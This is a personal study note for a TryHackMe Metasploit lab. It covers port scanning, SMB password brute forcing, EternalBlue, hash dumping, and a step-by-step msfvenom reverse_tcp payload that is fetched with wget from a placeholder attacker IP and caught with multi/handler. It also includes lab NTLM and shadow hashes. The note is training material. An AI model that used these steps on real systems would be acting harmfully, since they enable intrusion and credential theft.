---
Tags: MetaSploitExploitation
date: 06-20-2022
---

[TryHackMe Rooms](./TryHackMeRooms.md)

---


- learned to user metasploit scan module to scan ports 'scannner/portscan/tcp'
- found 5 open ports using that scanner
- used NMAP while in metasploit console 
- used scanner/smb/login module with a password file and the user penny when I ran the exploit  the password discovered was leo1234
- used info on smtp_relay module to discover that Campbell Murray wrote the module
## Task 5
- ran NMAP and found  several open ports and saved the output, it was a windows 7 machine.
- used the eternal blue exploit 
- NTLM hashes are located at %SystemRoot%/system32/config/SAM
- found a flag in jons documents
	- THM-5455554845
	- used hashdump in meterpreter to dump this hash
		-  pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::

## Task 6 Msfvenom
- cat /etc/shadow
```
+] murphy:$6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.:1001:1001::/home/murphy:/bin/sh
[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:

```

- here is a webpage with [meterpreter basics](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
- step one , create a linux payload 
	- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
- step two - upload it to target system
	- python3 -m http.server 9000 command and use wget http://ATTACKING_MACHINE_IP:9000/shell.elf to download it to the target machine
- step three - chmod +x shell to executable
- step four setup your listener in msfconsole
	- load multi/handler
	- set local port and host IP
	- set *PAYLOAD* to linux/x86/meterpreter/reverse_tcp
	- exploit
- run reverse shell on target machine
- loaded and ran post/linux/gather/hashdump to get linux hashes